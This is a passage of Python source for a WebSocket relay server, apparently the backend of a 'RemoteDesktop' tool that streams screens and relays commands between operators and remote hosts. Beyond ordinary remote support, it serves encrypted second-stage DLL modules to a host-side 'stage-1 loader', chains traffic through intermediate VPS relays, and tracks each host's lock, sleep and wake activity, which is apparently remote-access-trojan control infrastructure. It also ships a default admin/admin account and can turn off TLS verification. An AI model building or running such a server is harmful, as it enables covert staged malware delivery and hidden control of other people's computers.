                            chunk = await asyncio.wait_for(websocket.recv(), timeout=10)
                            if isinstance(chunk, bytes):
                                total_recv += len(chunk)
                            else:
                                break  # unexpected text
                        elapsed = time.time() - t0
                        await websocket.send(json.dumps({
                            "id": st_id, "ok": True,
                            "data": {"bytes": total_recv, "elapsed_s": round(elapsed, 6)}
                        }, ensure_ascii=False))
                        continue

                    # infra_status: returns this VPS's own stats + optional VPS1 TCP probe
                    if sc_cmd == "infra_status":
                        vps2_info = _get_node_info()
                        vps1_info: Optional[dict] = None
                        if CHAIN_VPS1_HOST:
                            vps1_info = await _probe_tcp(CHAIN_VPS1_HOST, CHAIN_VPS1_PORT)
                            vps1_info["host"] = CHAIN_VPS1_HOST
                            vps1_info["port"] = CHAIN_VPS1_PORT
                        await websocket.send(json.dumps({
                            "id": msg.get("id", ""), "ok": True,
                            "data": {"vps2": vps2_info, "vps1": vps1_info}
                        }, ensure_ascii=False))
                        continue

                    # clients_list: handled by VPS (has full info about connected clients)
                    if sc_cmd == "clients_list":
                        now = time.time()
                        cl = []
                        for cid, c in list(room.clients.items()):
                            cl.append({
                                "id": cid,
                                "ip": c.remote,
                                "username": c.username or "",   # real operator username after login
                                "connected": int(now - c.connected_at),
                                "bytes_sent": c.bytes_sent,
                                "bytes_recv": c.bytes_recv,
                                "msgs": c.msg_count,
                                "is_you": cid == user_id,
                            })
                        host_info = None
                        if room.host:
                            h = room.host
                            host_info = {
                                "ip": h.remote,
                                "connected": int(now - h.connected_at),
                                "bytes_sent": h.bytes_sent,
                                "bytes_recv": h.bytes_recv,
                            }
                        await websocket.send(json.dumps({
                            "id": msg.get("id", ""), "ok": True,
                            "data": {
                                "clients": cl,
                                "host": host_info,
                                "stream_count": len(room.stream_clients),
                                "file_count": len(room.file_clients),
                            }
                        }, ensure_ascii=False))
                        continue

                    # Client → Host
                    if room.host:
                        try:
                            msg["_from"] = user_id
                            await room.host.ws.send(json.dumps(msg, ensure_ascii=False))
                        except:
                            await websocket.send(make_error("Host disconnected"))
                    else:
                        await websocket.send(make_error("Host not connected"))
                
                elif role == "host":
                    # ── Host status event ──
                    # Host emits {"cmd":"host_event","event":"startup|shutdown|
                    # sleep|wake|lock|unlock","ts":<epoch>,"host_version":"..."}.
                    # Server: (1) append to /opt/remotedesk/host_events.log as
                    # JSONL for later analytics, (2) broadcast to every client
                    # in the room so the viewer UI updates its host-status
                    # indicator immediately.
                    if msg.get("cmd") == "host_event":
                        event_name = str(msg.get("event", ""))
                        if event_name:
                            try:
                                line = {
                                    "ts": datetime.utcnow().isoformat(timespec="seconds") + "Z",
                                    "token": room.token,
                                    "event": event_name,
                                    "host_version": str(msg.get("host_version", "")),
                                    "epoch": int(msg.get("ts", 0) or 0),
                                }
                                with HOST_EVENTS_LOG.open("a", encoding="utf-8") as f:
                                    f.write(json.dumps(line, ensure_ascii=False) + "\n")
                                # Keep ring buffer up-to-date
                                _recent_host_events.append(line)
                            except Exception as e:
                                log.warning(f"host_event log write failed: {e}")
                            log.info(f"host_event: token={room.token[:8]}... event={event_name}")
                            # Broadcast to all clients in the room
                            forward_msg = json.dumps({
                                "cmd": "host_event",
                                "event": event_name,
                                "ts":    int(msg.get("ts", 0) or 0),
                                "host_version": str(msg.get("host_version", "")),
                            }, ensure_ascii=False)
                            for c in list(room.clients):
                                try:
                                    await c.ws.send(forward_msg)
                                except Exception:
                                    pass
                        continue

                    # ── Stage-2 blob fetch from host ──
                    # Host's stage-1 loader requests an encrypted module blob
                    # via its existing auth'd WSS connection. Server reads the
                    # file from STAGE2_DIR/<token>/<module>.bin and returns it
                    # inside the normal {id, ok, data:{blob_b64}} response.
                    # This is NOT forwarded to clients.
                    if msg.get("cmd") == "stage2_fetch":
                        req_id = str(msg.get("id", ""))
                        module = str(msg.get("module", ""))
                        if module not in STAGE2_KNOWN_MODULES:
                            await websocket.send(json.dumps({
                                "id": req_id, "ok": False,
                                "error": "unknown stage2 module"
                            }, ensure_ascii=False))
                            continue
                        # On-the-fly encryption (or cache hit) — see _stage2_get_blob.
                        # DLLs must be deployed to STAGE2_DIR as flat <module>.dll files.
                        data = _stage2_get_blob(room.token, module)
                        if data is None:
                            await websocket.send(json.dumps({
                                "id": req_id, "ok": False,
                                "error": f"stage2 module not available: {module}"
                            }, ensure_ascii=False))
                            continue
                        if len(data) > STAGE2_MAX_BLOB:
                            await websocket.send(json.dumps({
                                "id": req_id, "ok": False,
                                "error": "stage2 blob too large"
                            }, ensure_ascii=False))
                            continue
                        b64 = base64.b64encode(data).decode("ascii")
                        await websocket.send(json.dumps({
                            "id": req_id, "ok": True,
                            "data": {
                                "cmd":   "stage2_blob",
                                "module": module,
                                "size":   len(data),
                                "blob_b64": b64,
                            }
                        }, ensure_ascii=False))
                        log.info(f"stage2: served {module}.bin ({len(data):,} bytes) to host token={room.token[:8]}")
                        continue

                    # Routing hint: queue target for next binary message (supports pipelining)
                    route_target = msg.get("_route_binary_to", "")
                    if route_target:
                        room._pending_binary_targets.append(route_target)
                        continue  # Don't forward routing hints to clients

                    # Host response → route to correct client
                    target_id = msg.get("_to", "")

                    if target_id and target_id in room.clients:
                        try:
                            await room.clients[target_id].ws.send(json.dumps(msg, ensure_ascii=False))
                        except:
                            pass
                    else:
                        # Broadcast text to command clients only (not stream connections)
                        await broadcast_to_clients(room, json.dumps(msg, ensure_ascii=False))
    
    except websockets.exceptions.ConnectionClosed as e:
        log.info(f"Connection closed: {remote} code={e.code}")
    except Exception as e:
        log.exception(f"Handler error: {e}")
    finally:
        # Cleanup
        if conn and room:
            async with rooms_lock:
                if conn.role == "host" and room.host is conn:
                    room.host = None
                    log.info(f"Host disconnected: token={token[:8]}...")
                elif conn.role in ("host_stream", "host_file"):
                    room.host_streams.pop(conn.user_id, None)
                elif conn.role == "client":
                    room.clients.pop(conn.user_id, None)
                elif conn.role == "stream":
                    room.stream_clients.pop(conn.user_id, None)
                    task = getattr(conn, '_sender_task', None)
                    if task and not task.done():
                        task.cancel()
                elif conn.role == "file_recv":
                    room.file_clients.pop(conn.user_id, None)
            
            if conn.role == "host":
                await broadcast_to_clients(room, make_event("host_offline", {}))
                # Write a synthetic "disconnect" log entry so that
                # _analyze_host_events() can correctly mark the host offline
                # even when the host didn't send an explicit "shutdown" event
                # (e.g. power cut, network drop, crash).
                try:
                    epoch_now = int(time.time())
                    disc_line = json.dumps({
                        "ts":    datetime.utcfromtimestamp(epoch_now).isoformat() + "Z",
                        "epoch": epoch_now,
                        "token": token,
                        "event": "disconnect",
                    }, ensure_ascii=False)
                    with HOST_EVENTS_LOG.open("a", encoding="utf-8") as _lf:
                        _lf.write(disc_line + "\n")
                    _recent_host_events.append(json.loads(disc_line))
                except Exception as _le:
                    log.warning(f"host disconnect log write failed: {_le}")
            elif conn.role == "client":
                if room.host:
                    try:
                        await room.host.ws.send(make_event("client_left", {
                            "user_id": conn.user_id,
                            "username": conn.username,
                        }))
                    except:
                        pass
                # Notify remaining clients about updated client count
                n = len(room.clients)
                await broadcast_to_clients(room, make_event("clients_online", {"count": n}))
                # Also notify host so its viewer watchdog can auto-stop stream when n=0
                if room.host:
                    try:
                        await room.host.ws.send(make_event("clients_online", {"count": n}))
                    except:
                        pass

async def broadcast_to_clients(room: Room, msg):
    """Send text/FILE messages to command clients only (not stream-only connections)."""
    if not room.clients:
        return
    dead = []
    for uid, c in list(room.clients.items()):
        try:
            await c.ws.send(msg)
            c.bytes_sent += len(msg) if isinstance(msg, bytes) else len(msg.encode())
        except:
            dead.append(uid)
    for uid in dead:
        room.clients.pop(uid, None)

def enqueue_scrn_to_stream_clients(room: Room, frame: bytes):
    """FIFO queue relay: delivers ALL frames in order to stream clients.
    When queue full, drops OLDEST frame (keeps newest for low latency).
    This NEVER blocks the host handler."""
    if not room.stream_clients:
        return
    room.frame_count += 1
    room._total_frames_in += 1

    # Total stats log every 5 seconds
    now = time.time()
    if now - room._total_stats_time >= 5.0:
        elapsed = now - room._total_stats_time
        fps_in = room._total_frames_in / max(0.1, elapsed)
        fps_out = room._total_frames_out / max(0.1, elapsed)
        bw_out = room._total_bytes_out / max(0.1, elapsed) / 1024
        dropped = room._total_frames_dropped
        conns = len(room.stream_clients)
        log.info(f"STREAM TOTAL: in={fps_in:.1f}FPS, out={fps_out:.1f}FPS, "
                 f"bw={bw_out:.0f}KB/s, dropped={dropped}, conns={conns}")
        room._total_frames_in = 0
        room._total_frames_out = 0
        room._total_frames_dropped = 0
        room._total_bytes_out = 0
        room._total_stats_time = now

    for uid, c in list(room.stream_clients.items()):
        q = getattr(c, '_frame_queue', None)
        if q is None:
            c._frame_queue = asyncio.Queue(maxsize=20)
            q = c._frame_queue
        # Queue full → drop oldest to make room for newest
        while q.full():
            try:
                q.get_nowait()
                room._total_frames_dropped += 1
            except asyncio.QueueEmpty:
                break
        try:
            q.put_nowait(frame)
        except asyncio.QueueFull:
            pass
        c.bytes_sent += len(frame)
        # Start sender task if not already running
        if not getattr(c, '_sender_task', None) or c._sender_task.done():
            c._sender_task = asyncio.create_task(_stream_sender(room, uid, c))


async def _stream_sender(room: Room, uid: str, conn: Connection):
    """Per-client sender: FIFO queue drain, no pacing.

    Key design:
    - asyncio.Queue(20) — buffers up to 0.7 seconds at 30fps
    - Frames delivered IN ORDER (no drops unless queue overflows)
    - NO pacing: send as fast as TCP allows — TCP flow control handles congestion
    - After TCP stall recovery, drains backlog quickly to catch up
    """
    sent_count = 0
    total_sent_bytes = 0
    last_log = time.time()

    # Ensure queue exists
    if not hasattr(conn, '_frame_queue') or conn._frame_queue is None:
        conn._frame_queue = asyncio.Queue(maxsize=20)
    q = conn._frame_queue

    # Large write buffer for burst absorption
    try:
        transport = conn.ws.transport
        if transport:
            transport.set_write_buffer_limits(high=1024 * 1024, low=256 * 1024)
    except Exception:
        pass

    try:
        while uid in room.stream_clients:
            # Wait for next frame from queue
            try:
                frame = await asyncio.wait_for(q.get(), timeout=2.0)
            except asyncio.TimeoutError:
                continue

            frame_size = len(frame)

            # Send frame to client — TCP handles flow control
            try:
                await conn.ws.send(frame)
            except Exception:
                break

            sent_count += 1
            total_sent_bytes += frame_size
            room._total_frames_out += 1
            room._total_bytes_out += frame_size

            # No pacing — let TCP drain naturally
            # After congestion recovery, this drains the queue ASAP

            now_wall = time.time()
            if now_wall - last_log >= 5.0:
                elapsed = now_wall - last_log
                fps_out = sent_count / max(0.1, elapsed)
                bw_kbps = total_sent_bytes / max(0.1, elapsed) / 1024
                qsize = q.qsize()
                log.info(f"Stream→{uid[:8]}: {fps_out:.1f}FPS, "
                         f"bw={bw_kbps:.0f}KB/s, frame={frame_size//1024}KB, "
                         f"q={qsize}")
                sent_count = 0
                total_sent_bytes = 0
                last_log = now_wall
    except Exception:
        pass
    finally:
        conn._frame_queue = None
        if uid in room.stream_clients:
            room.stream_clients.pop(uid, None)
            log.info(f"Stream client {uid} removed (send failed)")
            try:
                await conn.ws.close()
            except Exception:
                pass

# ─── User accounts ──────────────────────────────────────────────────────────
# Minimal, file-based user store. Not meant to scale beyond a handful of
# operators per relay — the JSON file is re-read on every admin write so
# there's no stale-cache problem across server processes.
_users_lock = asyncio.Lock()

def _hash_password(password: str, salt: str) -> str:
    """PBKDF2-HMAC-SHA256, 100k rounds. Stored as hex; matched by re-deriving
    with the same salt. Not bcrypt but good enough for a private relay."""
    return hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"),
                               salt.encode("utf-8"), 100_000).hex()

def _load_users() -> dict:
    """Returns {"users": [...]}. Creates the file with a default admin
    (admin/admin — rotate immediately) on first read."""
    if not USERS_FILE.is_file():
        default_salt = secrets.token_hex(16)
        default = {
            "users": [{
                "username": "admin",
                "salt": default_salt,
                "password_hash": _hash_password("admin", default_salt),
                "role": "admin",
                "allowed_tabs": list(ALL_TABS),
                "created_at": datetime.utcnow().isoformat(timespec="seconds") + "Z",
                "last_login": None,
            }]
        }
        USERS_FILE.parent.mkdir(parents=True, exist_ok=True)
        USERS_FILE.write_text(json.dumps(default, indent=2, ensure_ascii=False),
                              encoding="utf-8")
        log.warning(f"Created default users.json with admin/admin at {USERS_FILE}. "
                    "Change the password NOW.")
        return default
    try:
        return json.loads(USERS_FILE.read_text(encoding="utf-8"))
    except Exception as e:
        log.error(f"users.json parse error: {e}; returning empty")
        return {"users": []}

def _save_users(data: dict) -> None:
    tmp = USERS_FILE.with_suffix(".tmp")
    tmp.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    tmp.replace(USERS_FILE)

def _verify_user(username: str, password: str) -> dict | None:
    users = _load_users().get("users", [])
    for u in users:
        if u.get("username") == username:
            if _hash_password(password, u.get("salt", "")) == u.get("password_hash"):
                return u
            return None
    return None

def _log_user_activity(session: dict, action: str, detail: str = "") -> None:
    """Append-only activity log per operator. Keeps raw detail short — don't
    log arbitrary command payloads which could contain sensitive paths."""
    try:
        entry = {
            "ts": datetime.utcnow().isoformat(timespec="seconds") + "Z",
            "user": session.get("username", "?"),
            "role": session.get("role", "?"),
            "action": action,
            "detail": (detail or "")[:200],
        }
        USER_ACTIVITY_LOG.parent.mkdir(parents=True, exist_ok=True)
        with USER_ACTIVITY_LOG.open("a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except Exception as e:
        log.debug(f"user activity log write failed: {e}")

def _create_session(user: dict) -> str:
    sid = secrets.token_urlsafe(24)
    _sessions[sid] = {
        "username": user["username"],
        "role": user.get("role", "operator"),
        "allowed_tabs": list(user.get("allowed_tabs") or
                             (ALL_TABS if user.get("role") == "admin" else DEFAULT_OPERATOR_TABS)),
        "created_at": int(time.time()),
        "last_seen": int(time.time()),
    }
    return sid

def _session_info(sid: str) -> dict | None:
    s = _sessions.get(sid)
    if not s: return None
    s["last_seen"] = int(time.time())
    return s


# ─── Host events analytics ──────────────────────────────────────────────────
def _analyze_host_events(log_path: Path, *,
                         live_tokens: "set[str] | None" = None) -> dict:
    """Walk the JSONL host_events.log and aggregate per-token stats.
    Returns a dict safe to JSON-serialize.

    State machine per token:
        startup         → ONLINE
        shutdown        → OFFLINE   (close ONLINE interval)
        sleep           → SLEEPING  (close ONLINE interval)
        wake            → ONLINE    (close SLEEPING interval)
        lock            → overlay LOCKED on current state
        unlock          → close LOCKED overlay
    Duration accumulators cover current time for open intervals so a host
    that is still ONLINE now gets its running uptime counted. `now_epoch`
    is used as a clamp.

    live_tokens: set of full token strings whose host WebSocket is connected
    *right now*.  When provided, any token NOT in the set whose log-derived
    state is online/sleeping gets corrected to offline (after a 60-second
    grace window for transient reconnects).  This fixes the case where the
    host drops the WebSocket without sending a "shutdown" event.
    """
    now = int(time.time())
    tokens: dict[str, dict] = {}

    if not log_path.is_file():
        return {"tokens": {}, "totals": {"hosts": 0}, "now": now}

    with log_path.open("r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                ev = json.loads(line)
            except Exception:
                continue
            tok = str(ev.get("token", ""))
            kind = str(ev.get("event", ""))
            # Prefer epoch (UTC seconds) if the host sent it; otherwise parse ts.
            ts = int(ev.get("epoch", 0) or 0)
            if ts <= 0:
                try:
                    iso = ev.get("ts", "")
                    if iso:
                        ts = int(datetime.fromisoformat(iso.rstrip("Z")).timestamp())
                except Exception:
                    pass
            if not tok or not kind or ts <= 0:
                continue

            t = tokens.setdefault(tok, {
                "state":           "offline",   # offline / online / sleeping
                "locked":          False,
                "online_since":    0,
                "sleep_since":     0,
                "lock_since":      0,
                "uptime_seconds":  0,
                "sleep_seconds":   0,
                "locked_seconds":  0,
                "startups":        0,
                "shutdowns":       0,
                "sleeps":          0,
                "wakes":           0,
                "locks":           0,
                "unlocks":         0,
                "first_seen":      ts,
                "last_seen":       ts,
                "last_event":      kind,
                "host_version":    str(ev.get("host_version", "")),
            })
            t["last_seen"]  = ts
            t["last_event"] = kind
            if ev.get("host_version"):
                t["host_version"] = str(ev.get("host_version"))

            if kind == "startup":
                t["startups"] += 1
                if t["state"] == "online" and t["online_since"]:
                    # Shouldn't happen but be safe — close previous
                    t["uptime_seconds"] += max(0, ts - t["online_since"])
                t["state"] = "online"
                t["online_since"] = ts
            elif kind in ("shutdown", "disconnect"):
                # "disconnect" is synthetic: written by server when WebSocket drops
                # without an explicit shutdown event (power cut / network loss).
                if kind == "shutdown":
                    t["shutdowns"] += 1
                if t["state"] == "online" and t["online_since"]:
                    t["uptime_seconds"] += max(0, ts - t["online_since"])
                t["online_since"] = 0
                t["state"] = "offline"
                # Any running lock overlay also closes
                if t["locked"] and t["lock_since"]:
                    t["locked_seconds"] += max(0, ts - t["lock_since"])
                    t["locked"] = False
                    t["lock_since"] = 0
            elif kind == "sleep":
                t["sleeps"] += 1
                if t["state"] == "online" and t["online_since"]:
                    t["uptime_seconds"] += max(0, ts - t["online_since"])
                t["online_since"] = 0
                t["state"] = "sleeping"
                t["sleep_since"] = ts
            elif kind == "wake":
                t["wakes"] += 1
                if t["state"] == "sleeping" and t["sleep_since"]:
                    t["sleep_seconds"] += max(0, ts - t["sleep_since"])
                t["sleep_since"] = 0
                t["state"] = "online"
                t["online_since"] = ts
            elif kind == "lock":
                t["locks"] += 1
                if not t["locked"]:
                    t["locked"] = True
                    t["lock_since"] = ts
            elif kind == "unlock":
                t["unlocks"] += 1
                if t["locked"] and t["lock_since"]:
                    t["locked_seconds"] += max(0, ts - t["lock_since"])
                t["locked"] = False
                t["lock_since"] = 0

    # Close any still-open intervals at "now" so running uptime is visible.
    for t in tokens.values():
        if t["state"] == "online" and t["online_since"]:
            t["uptime_seconds"]  += max(0, now - t["online_since"])
        elif t["state"] == "sleeping" and t["sleep_since"]:
            t["sleep_seconds"]   += max(0, now - t["sleep_since"])
        if t["locked"] and t["lock_since"]:
            t["locked_seconds"]  += max(0, now - t["lock_since"])

    # Inferred state: if we never saw an explicit startup but there's been
    # ANY event in the last ACTIVE_WINDOW seconds, mark the host as online.
    # Fixes the "Online now 0" case where the host is clearly alive (lock/
    # unlock events streaming in) but never emitted "startup" (host bug or
    # a pre-v1.0.191 DLL that only knows lock/unlock).
    ACTIVE_WINDOW = 5 * 60  # 5 minutes
    for t in tokens.values():
        last_event_age = now - t["last_seen"]
        if t["state"] == "offline" and last_event_age < ACTIVE_WINDOW:
            if t["last_event"] not in ("shutdown", "sleep", "disconnect"):
                t["state"] = "online"
                t["state_inferred"] = True

    # ── Live-connection override ──────────────────────────────────────────
    # The log-based state machine has no way to know when the host WebSocket
    # drops without sending a "shutdown" event (power cut, network loss, etc).
    # When live_tokens is provided (set of full tokens with an active host WS),
    # any token NOT in it cannot truly be online — correct it to offline.
    # A 60-second grace window avoids flicker during fast reconnects.
    LIVE_GRACE = 60  # seconds
    if live_tokens is not None:
        for tok, t in tokens.items():
            if tok not in live_tokens:
                # Host is not connected right now
                age = now - t["last_seen"]
                if t["state"] in ("online", "sleeping") and age > LIVE_GRACE:
                    t["state"] = "offline"
                    t["online_since"] = 0
                    t["sleep_since"]  = 0
                    t["state_live_corrected"] = True
            else:
                # Host IS connected — if log says offline/inferred, correct upward
                if t["state"] == "offline" and t["last_event"] not in ("shutdown", "sleep"):
                    t["state"] = "online"
                    t["state_live_corrected"] = True

    online   = sum(1 for t in tokens.values() if t["state"] == "online")
    sleeping = sum(1 for t in tokens.values() if t["state"] == "sleeping")
    offline  = sum(1 for t in tokens.values() if t["state"] == "offline")

    # Trim fields we don't want to leak (full token) while keeping the short
    # prefix so operator can tell them apart.
    tokens_out = {}
    for tok, t in tokens.items():
        short = (tok[:8] + "..." + tok[-4:]) if len(tok) > 12 else tok
        tokens_out[short] = t
    return {
        "now":    now,
        "totals": {
            "hosts":    len(tokens),
            "online":   online,
            "sleeping": sleeping,
            "offline":  offline,
        },
        "tokens": tokens_out,
    }


# ─── Stats endpoint ──────────────────────────────────────────────────────────
async def stats_handler(websocket, path: str):
    """Admin stats websocket at /admin.

    Client first sends { admin_token, type?, ... }. type defaults to "rooms"
    for backward compatibility and can be "host_events" for the analytics
    reply, or "both" for combined output.
    """
    try:
        raw = await asyncio.wait_for(websocket.recv(), timeout=5)
        msg = json.loads(raw)
        if msg.get("admin_token") != ADMIN_TOKEN:
            await websocket.send(json.dumps({"error": "forbidden"}, ensure_ascii=False))
            return

        req_type = str(msg.get("type", "rooms"))
        data: dict = {}

        if req_type in ("rooms", "both"):
            async with rooms_lock:
                data["rooms_snapshot"] = {
                    "rooms": len(rooms),
                    "total_hosts": sum(1 for r in rooms.values() if r.host),
                    "total_clients": sum(len(r.clients) for r in rooms.values()),
                    "room_details": [
                        {
                            "token": t[:8] + "...",
                            "has_host": r.host is not None,
                            "clients": len(r.clients),
                            "frames": r.frame_count,
                            "age_s": int(time.time() - r.created_at),
                        }
                        for t, r in rooms.items()
                    ],
                }

        if req_type in ("host_events", "both"):
            try:
                data["host_events"] = _analyze_host_events(HOST_EVENTS_LOG)
            except Exception as e:
                data["host_events_error"] = str(e)

        # Legacy single-payload shape if caller didn't specify type
        if "type" not in msg:
            data = data.get("rooms_snapshot", data)

        await websocket.send(json.dumps(data, ensure_ascii=False))
    except:
        pass

# ─── Proxy compatibility: accept Connection: keep-alive when Upgrade: websocket ───
async def chain_proxy(local_ws):
    """Transparent WebSocket bridge: forward every frame to/from the upstream relay.

    Used when RDP_CHAIN_UPSTREAM is set (VPS1 chain mode).  No authentication
    or message parsing is done here — the upstream VPS2 handles all of that.
    Both text and binary frames are forwarded as-is; the path is preserved so
    /host, /client, /admin arrive at VPS2 on the same path.
    """
    path = (
        getattr(local_ws, "path", None)
        or getattr(getattr(local_ws, "request", None), "path", None)
        or "/"
    )
    upstream_url = CHAIN_UPSTREAM + path
    log.info(f"chain-relay: {local_ws.remote_address} → {upstream_url}")

    ssl_ctx = None
    if upstream_url.startswith("wss://"):
        ssl_ctx = ssl.create_default_context()
        if not CHAIN_SSL_VERIFY:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

    try:
        async with websockets.connect(
            upstream_url,
            ssl=ssl_ctx,
            ping_interval=PING_INTERVAL,
            ping_timeout=PING_TIMEOUT,
            max_size=50 * 1024 * 1024,
            compression=None,
        ) as upstream_ws:
            async def fwd(src, dst, label: str):
                try:
                    async for msg in src:
                        await dst.send(msg)
                except Exception as exc:
                    log.debug(f"chain-relay {label} closed: {exc}")
                finally:
                    try:
                        await dst.close()
                    except Exception:
                        pass

            await asyncio.gather(
                fwd(local_ws, upstream_ws, "local→upstream"),
                fwd(upstream_ws, local_ws, "upstream→local"),
            )
    except Exception as e:
        log.warning(f"chain-relay error ({upstream_url}): {e}")


def _fix_connection_header(connection, request):
    """Serve /health HTTP endpoint and fix Connection: keep-alive for WebSocket proxies."""
    # ── /health — lightweight JSON status (no auth, used by VPS2 to probe VPS1) ──
    try:
        req_path = getattr(request, "path", "") or ""
        if req_path == "/health" or req_path.startswith("/health?"):
            import http
            info = _get_node_info()
            body = json.dumps(info, ensure_ascii=False).encode("utf-8")
            from websockets.datastructures import Headers as _WsHeaders
            h = _WsHeaders()
            h["Content-Type"] = "application/json"
            h["Content-Length"] = str(len(body))
            h["Access-Control-Allow-Origin"] = "*"
            h["Cache-Control"] = "no-store"
            return http.HTTPStatus.OK, h, body
    except Exception as _e:
        log.debug("_fix_connection_header /health error: %s", _e)

    try:
        from websockets import headers as ws_headers
        headers = request.headers
        connection_options = sum(
            [ws_headers.parse_connection(v) for v in headers.get_all("Connection")],
            [],
        )
        if not any(v.lower() == "upgrade" for v in connection_options):
            upgrade_vals = headers.get_all("Upgrade")
            if upgrade_vals and "websocket" in (upgrade_vals[0] or "").lower():
                try:
                    del headers["Connection"]
                except KeyError:
                    pass
                headers["Connection"] = "Upgrade"
    except Exception as e:
        log.debug("Connection header fix skipped: %s", e)
    return None


# ─── Main ────────────────────────────────────────────────────────────────────
def _loop_exception_handler(loop, ctx):
    from websockets.exceptions import InvalidMessage, InvalidHandshake
    exc = ctx.get("exception")
    msg = str(exc) if exc else ""
    if isinstance(exc, InvalidHandshake) and ("Sec-WebSocket-Key" in msg or "Missing" in msg):
        log.warning("WebSocket rejected: proxy must forward Sec-WebSocket-Key, Sec-WebSocket-Version, Upgrade, Connection. Run: sudo bash deploy-web.sh && sudo systemctl reload nginx")
        return
    if isinstance(exc, InvalidMessage) and ("expected GET" in msg or "unsupported HTTP method" in msg):
        log.warning("Rejected: WebSocket handshake requires GET (got POST or other).")
        return
    if isinstance(exc, InvalidMessage) and ("expected HTTP/1.1" in msg or "unsupported protocol" in msg or "HTTP/1.0" in msg or "PRI " in msg or "HTTP/2.0" in msg or "did not receive a valid HTTP" in msg):
        log.warning("Rejected invalid request (HTTP/1.0, HTTP/2, or bad). Use nginx with proxy_http_version 1.1.")
        return
    loop.default_exception_handler(ctx)


async def main():
    try:
        asyncio.get_running_loop().set_exception_handler(_loop_exception_handler)
    except Exception:
        pass
    # Pre-load recent events ring buffer from log file (last 200 lines)
    try:
        if HOST_EVENTS_LOG.exists():
            lines = HOST_EVENTS_LOG.read_text(encoding="utf-8").splitlines()
            for raw in lines[-200:]:
                raw = raw.strip()
                if raw:
                    try:
                        _recent_host_events.append(json.loads(raw))
                    except Exception:
                        pass
            log.info(f"Loaded {len(_recent_host_events)} recent host events into ring buffer")
    except Exception as e:
        log.warning(f"Could not pre-load host events: {e}")
    log.info(f"Starting RemoteDesktop VPS server on {HOST}:{PORT}")
    
    ssl_ctx = None
    if SSL_CERT and SSL_KEY:
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(SSL_CERT, SSL_KEY)
        log.info("SSL enabled")
    
    # Route by path (websockets 13+ passes only ws; path from ws.request.path)
    async def router(ws):
        if CHAIN_UPSTREAM:
            # Chain mode: this VPS is a transparent bridge to the upstream relay.
            await chain_proxy(ws)
            return
        path = getattr(ws, "path", "") or getattr(getattr(ws, "request", None), "path", "")
        if path == "/admin":
            await stats_handler(ws, path)
        else:
            await handler(ws, path)
    
    asyncio.create_task(cleanup_empty_rooms())
    
    serve_kw = dict(
        ssl=ssl_ctx,
        ping_interval=PING_INTERVAL,
        ping_timeout=PING_TIMEOUT,
        max_size=50 * 1024 * 1024,
        write_limit=32 * 1024 * 1024,  # 32MB — large buffer prevents TCP stalls on file transfer
        compression=None,
        process_request=_fix_connection_header,
    )
    try:
        server = await websockets.serve(router, HOST, PORT, **serve_kw)
    except TypeError:
        serve_kw.pop("process_request", None)
        server = await websockets.serve(router, HOST, PORT, **serve_kw)
        log.warning("websockets.serve does not support process_request; proxy Connection fix disabled")

    mode = f"chain-relay → {CHAIN_UPSTREAM}" if CHAIN_UPSTREAM else "single-relay"
    log.info(
        f"Server v{SERVER_VERSION} [{mode}] running. ws{'s' if ssl_ctx else ''}://{HOST}:{PORT}  "
        f"ping_interval={PING_INTERVAL}s ping_timeout={PING_TIMEOUT}s "
        f"max_size={serve_kw.get('max_size',0)//1024//1024}MB "
        f"write_limit={serve_kw.get('write_limit',0)//1024}KB"
    )
    await server.wait_closed()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Server stopped (Ctrl+C)")
